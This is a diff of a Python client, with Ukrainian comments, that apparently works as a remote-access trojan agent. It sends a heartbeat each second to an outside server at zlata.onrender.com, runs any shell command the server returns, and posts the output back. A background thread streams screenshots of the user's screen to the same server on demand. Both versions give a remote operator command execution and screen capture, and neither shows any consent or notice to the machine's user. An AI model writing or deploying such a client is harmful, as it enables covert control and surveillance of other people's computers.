@@ -1,106 +1,84 @@
 import time
-import os
 import io
-import base64
+import threading
 import subprocess
 import requests
-import psutil
-import uuid
 import socket
+import uuid
 from PIL import ImageGrab
 
-# ⚙️ ВКАЖІТЬ АДРЕСУ ВАШОГО СЕРВЕРА (наприклад: https://your-app.onrender.com)
-SERVER_URL = "http://127.0.0.1:5000"
+# Вкажіть IP вашого сервера
+SERVER_URL = "https://zlata.onrender.com"
 
-HWID = f"{socket.gethostname()}-{uuid.getnode()}"
+# Генеруємо унікальний ID для цього ПК та дістаємо його ім'я
+CLIENT_ID = str(uuid.getnode()) + "-" + socket.gethostname()
+PC_NAME = socket.gethostname()
 
-def get_screenshot_b64():
-    try:
-        img = ImageGrab.grab()
-        img.thumbnail((1280, 720))
-        buffer = io.BytesIO()
-        img.save(buffer, format="JPEG", quality=50)
-        return base64.b64encode(buffer.getvalue()).decode('utf-8')
-    except Exception:
-        return ""
+STREAMING_ACTIVE = False
 
-def get_processes():
-    procs = []
-    try:
-        for p in psutil.process_iter(['pid', 'name']):
-            procs.append(p.info)
-            if len(procs) >= 30:
-                break
-    except Exception:
-        pass
-    return procs
+def stream_screen():
+    global STREAMING_ACTIVE
+    while True:
+        # Транслюємо екран ТІЛЬКИ якщо сервер дав команду (якщо адмін дивиться)
+        if STREAMING_ACTIVE:
+            try:
+                img = ImageGrab.grab()
+                buffer = io.BytesIO()
+                img.save(buffer, format='JPEG', quality=40)
+                
+                requests.post(
+                    f"{SERVER_URL}/api/upload_frame/{CLIENT_ID}",
+                    data=buffer.getvalue(),
+                    timeout=2
+                )
+            except Exception:
+                pass
+            time.sleep(0.05) # ~20 FPS
+        else:
+            # Якщо адмін не дивиться — просто спимо і не їмо пам'ять/процесор
+            time.sleep(0.5)
 
-def execute_cmd(command):
-    try:
-        res = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=12)
-        output = res.stdout or res.stderr or "Команда виконана (немає виводу)."
-        return output
-    except Exception as e:
-        return f"Помилка виконання: {str(e)}"
-
-def run_agent():
-    print(f"🤖 Агент запущено. ПК: {socket.gethostname()}. Сервер: {SERVER_URL}")
-    last_cmd_out = None
-    
+def heartbeat_and_cmd():
+    global STREAMING_ACTIVE
     while True:
         try:
-            cpu = psutil.cpu_percent()
-            ram = psutil.virtual_memory().percent
-            screen_b64 = get_screenshot_b64()
-            procs = get_processes()
+            # Надсилаємо серверу "пульс", щоб він знав, що ми в мережі
+            payload = {"client_id": CLIENT_ID, "name": PC_NAME}
+            res = requests.post(f"{SERVER_URL}/api/heartbeat", json=payload, timeout=3)
             
-            payload = {
-                'hwid': HWID,
-                'hostname': socket.gethostname(),
-                'cpu': cpu,
-                'ram': ram,
-                'screenshot': screen_b64,
-                'processes': procs,
-                'cmd_output': last_cmd_out
-            }
-            last_cmd_out = None
-
-            response = requests.post(f"{SERVER_URL}/api/agent/report", json=payload, timeout=5)
-            
-            if response.status_code == 200:
-                data = response.json()
-                commands = data.get('commands', [])
+            if res.status_code == 200:
+                data = res.json()
                 
-                for item in commands:
-                    c_type = item.get('type')
-                    c_payload = item.get('payload')
+                # Сервер вирішує, чи маємо ми зараз знімати екран
+                STREAMING_ACTIVE = data.get("stream", False)
+                
+                # Перевіряємо чи є нові команди
+                cmd = data.get("cmd", "")
+                if cmd:
+                    proc = subprocess.run(
+                        cmd,
+                        shell=True,
+                        capture_output=True,
+                        text=True,
+                        timeout=30
+                    )
+                    output = proc.stdout + proc.stderr
+                    if not output.strip():
+                        output = "[Команду виконано успішно]"
                     
-                    if c_type == 'cmd':
-                        print(f"Виконання CMD: {c_payload}")
-                        last_cmd_out = execute_cmd(c_payload)
-                        
-                    elif c_type == 'kill_proc':
-                        try:
-                            psutil.Process(int(c_payload)).kill()
-                            last_cmd_out = f"Процес {c_payload} завершено."
-                        except Exception as e:
-                            last_cmd_out = f"Помилка зупинки PID {c_payload}: {e}"
-                            
-                    elif c_type == 'troll':
-                        if c_payload == 'beep':
-                            try:
-                                import winsound
-                                winsound.Beep(1000, 500)
-                            except Exception:
-                                pass
-                        elif c_payload == 'msg':
-                            execute_cmd('msg * "Hello from Neon Remote!"')
-
+                    requests.post(
+                        f"{SERVER_URL}/api/post_output/{CLIENT_ID}",
+                        data=output.encode("utf-8"),
+                        timeout=3
+                    )
         except Exception:
-            time.sleep(3)
-            continue
+            # Якщо сервер впав, припиняємо зйомку екрана
+            STREAMING_ACTIVE = False
             
-        time.sleep(1.5)
+        time.sleep(1) # Перевіряємо зв'язок кожну секунду
 
-if __name__ == '__main__':
-    run_agent()
+if __name__ == "__main__":
+    # Запускаємо потік для зйомки екрану у фоні
+    threading.Thread(target=stream_screen, daemon=True).start()
+    # Запускаємо основний цикл зв'язку з сервером
+    heartbeat_and_cmd()
